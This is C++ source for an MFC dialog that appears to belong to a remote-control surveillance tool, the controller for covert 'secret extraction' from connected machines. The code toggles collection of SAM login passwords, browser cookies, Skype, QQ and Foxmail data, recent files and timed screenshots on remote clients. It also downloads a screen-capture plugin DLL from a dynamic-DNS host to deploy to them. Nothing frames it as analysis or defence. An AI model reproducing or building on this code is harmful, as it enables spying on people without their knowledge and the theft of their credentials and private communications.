// DlgSecretGet.cpp : 实现文件
//

#include "stdafx.h"
#include "TSPClientPublic.h"
#include "TSPClient.h"
#include "DlgSecretGet.h"
#include "TSPClientView.h"


// CDlgSecretGet 对话框
extern CTSPClientView* g_pConnectView;
CDlgSecretGet::ID_CONTRAST CDlgSecretGet::m_sIDContrast[] = 
{
	{SECRET_RECENT,		IDC_CHK_RECET},
	{SECRET_WEB,		IDC_CHK_WEB},
	{SECRET_SKYPE,		IDC_CHK_SKYPE},
	{SECRET_QQLOG,		IDC_CHKQQLOG},
	{SECRET_SAM,	IDC_CHKLOGINPASS},
	{SECRET_SCREEN,		IDC_CHKSCREEN},
	{SECRET_COOKIES,	IDC_CHKCOOKIES},
	{SECRET_CLEVERSRC,	IDC_CHKCLEVERSRC},
	{SECRET_FOXMAIL,	IDC_CHKFOXMAIL},
};

CDlgSecretGet::ID_CONTRAST CDlgSecretGet::m_sAlarmSrnConst[] = 
{
	{ALARMSCREEN_LIUSHUI,	IDC_CHKALARMSRC_LIUSHUI},
	{ALARMSCREEN_MINGAN,	IDC_CHKALARMSRC_MINGAN},
	{ALARMSCREEN_GUANZHU,	IDC_CHKALARMSRC_GUANZHU},
};

CDlgSecretGet::DESDEEP CDlgSecretGet::m_sScreenBitDeep[] = 
{
	{1,		"黑白"},
	{4,		"16色"},
	{8,		"256色"},
};

LPSTR CDlgSecretGet::m_szStateDes[] = 
{
	_T("当前状态: 取证中..."),
	_T("当前状态: 停止取证"),
};

IMPLEMENT_DYNAMIC(CDlgSecretGet, CDialog)

CDlgSecretGet::CDlgSecretGet(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CDlgSecretGet::IDD, pParent)
	, m_strScrTime(_T(""))
{
	m_pContext = pContext;
	m_iocpServer = pIOCPServer;
	m_pCTSPView=(CTSPClientView *)pParent;
	m_nSizeofSstrcttate = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	memcpy(&m_infoSate, m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_nSizeofSstrcttate);
	::ZeroMemory(&m_infoSateNew, sizeof(m_infoSateNew));
}

CDlgSecretGet::~CDlgSecretGet()
{
}

void CDlgSecretGet::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_COMBO_SCRBIT, m_ctlCombBitScreen);
	DDX_Text(pDX, IDC_SCRTIME, m_strScrTime);
}


BEGIN_MESSAGE_MAP(CDlgSecretGet, CDialog)
	ON_BN_CLICKED(ID_BTN_START, &CDlgSecretGet::OnBnClickedBtnStart)
	ON_BN_CLICKED(ID_BTN_STOP, &CDlgSecretGet::OnBnClickedBtnStop)
	ON_BN_CLICKED(IDC_BTN_UPPLUGSRC, &CDlgSecretGet::OnBnClickedBtnUpplugsrc)
	ON_BN_CLICKED(ID_BTN_RESET, &CDlgSecretGet::OnBnClickedBtnReset)
	ON_BN_CLICKED(IDC_CHKCLEVERSRC, &CDlgSecretGet::OnBnClickedChkcleversrc)
END_MESSAGE_MAP()


// CDlgSecretGet 消息处理程序

BOOL CDlgSecretGet::OnInitDialog()
{
	CDialog::OnInitDialog();

	for (int i=0; i<sizeof(m_sScreenBitDeep)/sizeof(m_sScreenBitDeep[0]); i++)
	{
		m_ctlCombBitScreen.AddString(m_sScreenBitDeep[i].szDesDeep);
	}
	
	UpdateState();

	//OnBnClickedBtnStart();


	// TODO:  在此添加额外的初始化
	
	return TRUE;  // return TRUE unless you set the focus to a control
	// 异常: OCX 属性页应返回 FALSE
}


void CDlgSecretGet::UpdateState()
{
	for (int i=0; i<sizeof(m_sIDContrast)/sizeof(ID_CONTRAST); i++)
	{
		((CButton *)GetDlgItem(m_sIDContrast[i].nResourceId))->SetCheck(BST_UNCHECKED);

		if (m_infoSate.nCapacity & m_sIDContrast[i].nCommandId)
		{
			GetDlgItem(m_sIDContrast[i].nResourceId)->EnableWindow(TRUE);//激活
		}
		if (m_infoSate.nAvalible & m_sIDContrast[i].nCommandId)
		{
			((CButton *)GetDlgItem(m_sIDContrast[i].nResourceId))->SetCheck(BST_CHECKED);//选上
		}
	}

	SetDlgItemText(IDC_STATIC_STATE, m_szStateDes[m_infoSate.dwType]);

	//if (m_nSizeofSstrcttate == 24)
	{
		GetDlgItem(IDC_SCRTIME)->EnableWindow(TRUE);
		GetDlgItem(IDC_COMBO_SCRBIT)->EnableWindow(TRUE);

		if ((m_infoSate.nCapacity & SECRET_SCREEN))
		{

			CString str;
			if (m_infoSate.infoScreen.FtpConfig.m_nScrTimeInternal)
			{
				str.Format(_T("%d"), m_infoSate.infoScreen.FtpConfig.m_nScrTimeInternal);
			}
			else
			{
				str="30";//默认30s
			}

			GetDlgItem(IDC_SCRTIME)->SetWindowText(str);

			for (int i=0; i<sizeof(m_sScreenBitDeep)/sizeof(m_sScreenBitDeep[0]); i++)
			{
				if (m_infoSate.infoScreen.FtpConfig.m_nScrBitCount == m_sScreenBitDeep[i].nDeepID)
				{
					m_ctlCombBitScreen.SetCurSel(i);
					break;
				}
			}	

		}

		//触景截屏按钮,如果不支持触景截屏则开启下载插件按钮
		if (!(m_infoSate.nCapacity & SECRET_CLEVERSRC))
		{
		//	GetDlgItem(IDC_BTN_UPPLUGSRC)->EnableWindow(TRUE);
		}
	}

	if (m_nSizeofSstrcttate == 28)
	{
		GetDlgItem(IDC_CHKALARMSRC_LIUSHUI)->EnableWindow(TRUE);
		GetDlgItem(IDC_CHKALARMSRC_MINGAN)->EnableWindow(TRUE);
		GetDlgItem(IDC_CHKALARMSRC_GUANZHU)->EnableWindow(TRUE);
	}
}


void CDlgSecretGet::OnReceiveComplete()
{
	int nCmd = m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0];
	BYTE bRet = m_pContext->m_DeCompressionBuffer.GetBuffer(0)[1];

	//DWORD dwTmpVar;

	switch (nCmd)
	{
	case COMMAND_SERECT_CFG_END:
		if (bRet)
		{//配置成功后，重新获取一下状态			
			BYTE bToken = COMMAND_SERECT_GETSTATE;
			Sleep(1000*5);//暂停5s获取状态
			m_iocpServer->Send(m_pContext, &bToken, sizeof(bToken));


		}
		else
		{
		//	this->MessageBox("配置密取参数失败",0,MB_ICONERROR);
		//	AfxMessageBox("配置密取参数失败");
		}
		break;		

	case COMMAND_SERECT_GETSTATE:
		
		//dwTmpVar=m_infoSate.infoScreen.FtpConfig.m_nScrTimeInternal;
		memcpy(&m_infoSate, m_pContext->m_DeCompressionBuffer.GetBuffer(1), m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);
		UpdateState();
		this->MessageBox("设置成功，窗口即将关闭",0,0);
	    OnCancel();
		break;
 
	case COMMAND_SERECT_RESETEND:
		this->MessageBox("重置密取对象成功,窗口即将关闭，请重新打开配置窗口进行设置",0,0);
		//AfxMessageBox("重置密取对象成功,窗口即将关闭，请重新打开配置窗口进行设置");
		OnCancel();
		break;

	default:	
		break;
	}

	UpdateState();
}


void CDlgSecretGet::OnBnClickedBtnStart()
{
	UpdateData(TRUE);
    


	CListCtrl*m_pListCtrl=m_pCTSPView->m_pListCtrl;

	CString  strMAC;

 	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
 	while(pos) //so long as we have a valid POSITION, we keep iterating
 	{
 		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
 		strMAC = m_pListCtrl->GetItemText(nItem,COL_HARDID);
	}



	TCHAR szFile[MAX_PATH]={0};
	GetModuleFileName(0,szFile,MAX_PATH);
	TCHAR *strPos=StrRChr(szFile,0,'\\');

	if (strPos)
	{
		*(strPos+1)=0;
		strcat(szFile,szAutoCapSrccenFile);
	}
	TCHAR *key=0;
	GetCheckBoxParam();
	m_pCTSPView->GetAutoScreenConfig((pAUTOSREECNCONFIG)(&m_infoSateNew.infoScreen),strMAC.GetBuffer(NULL));

	if (!(m_infoSateNew.nAvalible&SECRET_SCREEN))
	{
		m_infoSateNew.infoScreen.FtpConfig.m_nScrTimeInternal=0;
		key="false";
	}
	else key="true";
	WritePrivateProfileStringA((LPCSTR)strMAC,"Auto",key,szFile);


	//AfxMessageBox("fdfd");


	int nSizePack = m_nSizeofSstrcttate + 1;
	BYTE bPacket[sizeof(INFOSTATE) + 1] = {0};
	bPacket[0] = TOKEN_EVIDENCE_CONFIG;
	memcpy(&(bPacket[1]), &m_infoSateNew, m_nSizeofSstrcttate);

	//AfxMessageBox("fdfd");

	m_iocpServer->Send(m_pContext, bPacket, nSizePack);

	SetDlgItemText(IDC_STATIC_STATE, "当前状态:正在设置中...");

	GetDlgItem(ID_BTN_START)->EnableWindow(FALSE);
	GetDlgItem(ID_BTN_RESET)->EnableWindow(FALSE);



}


void CDlgSecretGet::OnBnClickedBtnStop()
{
	TCHAR szHelp[MAX_PATH]={0};

	wsprintf(szHelp,"%s\\%s",GetExeCurrentDir(),"evidence");

	::ShellExecute(m_hWnd , "open",szHelp, NULL, NULL, SW_SHOWNORMAL);

	OnCancel();
}


BOOL CDlgSecretGet::GetCheckBoxParam()
{
	UpdateData(TRUE);
	::ZeroMemory(&m_infoSateNew, sizeof(m_infoSateNew));

	for (int i=0; i<sizeof(m_sIDContrast)/sizeof(ID_CONTRAST); i++)
	{
		if (BST_CHECKED == ((CButton *)GetDlgItem(m_sIDContrast[i].nResourceId))->GetCheck())
		{
			m_infoSateNew.nAvalible |= m_sIDContrast[i].nCommandId;
		}		
	}

	//if (m_nSizeofSstrcttate == 24)
	{
		int nSelPos = m_ctlCombBitScreen.GetCurSel();
		m_infoSateNew.infoScreen.FtpConfig.m_nScrBitCount = m_sScreenBitDeep[nSelPos].nDeepID;
		m_infoSateNew.infoScreen.FtpConfig.m_nScrTimeInternal = _ttoi(m_strScrTime);
		
		//by zjw 保存到配置文件中
		TCHAR szFile[MAX_PATH]={0};
		GetModuleFileName(0,szFile,MAX_PATH);
		TCHAR *strPos=StrRChr(szFile,0,'\\');
		if (strPos)
		{
			*(strPos+1)=0;
			strcat(szFile,szAutoCapSrccenFile);
		}
		char sztmp[20];
		_itoa_s(m_infoSateNew.infoScreen.FtpConfig.m_nScrTimeInternal,sztmp,10);
 		POSITION pos = g_pConnectView->m_pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
 		while(pos) //so long as we have a valid POSITION, we keep iterating
 		{	
 			int	nItem = g_pConnectView->m_pListCtrl->GetNextSelectedItem(pos);
 			CString szMACID = g_pConnectView->m_pListCtrl->GetItemText(nItem,COL_HARDID);
			if(szMACID)
				WritePrivateProfileStringA(szMACID,"TimeInternal",sztmp,szFile);
		}
	}

	if (m_nSizeofSstrcttate == 28)
	{
		for (int i=0; i<sizeof(m_sAlarmSrnConst)/sizeof(ID_CONTRAST); i++)
		{
			if (BST_CHECKED == ((CButton *)GetDlgItem(m_sAlarmSrnConst[i].nResourceId))->GetCheck())
			{
				m_infoSateNew.nTypeAlarmSrn |= m_sAlarmSrnConst[i].nCommandId;
			}		
		}
	}

	return TRUE;
}


void CDlgSecretGet::OnBnClickedBtnUpplugsrc()
{

	CTSPClientView* pView=(CTSPClientView*)((CFrameWnd*)AfxGetApp()->m_pMainWnd)->GetActiveView(); 
	char szHttpUrl[MAX_PATH] = {0};
#ifndef PUBLISH
	wsprintf(szHttpUrl, "%s", "http://10.0.12.80:801//AlarmScreen.dll");
#else
	wsprintf(szHttpUrl, "%s", "http://lazycat8049.gicp.net:801//PLUGIN//AlarmScreen.dll");
#endif
	pView->DownPluginForMiqu(szHttpUrl);
}



void CDlgSecretGet::OnBnClickedBtnReset()
{
	int nSizePack = 1;
	BYTE bPacket[sizeof(INFOSTATE) + 1] = {0};
	bPacket[0] = TOKEN_EVIDENCE_RESET;

	m_iocpServer->Send(m_pContext, bPacket, nSizePack);
}


void CDlgSecretGet::OnBnClickedChkcleversrc()
{
	int StateCheck = BST_UNCHECKED;

	if (BST_CHECKED == ((CButton *)GetDlgItem(IDC_CHKCLEVERSRC))->GetCheck())
	{
		StateCheck = BST_CHECKED;
	}

	for (int i=0; i<sizeof(m_sAlarmSrnConst)/sizeof(ID_CONTRAST); i++)
	{
		((CButton *)GetDlgItem(m_sAlarmSrnConst[i].nResourceId))->SetCheck(StateCheck);		
	}	
}
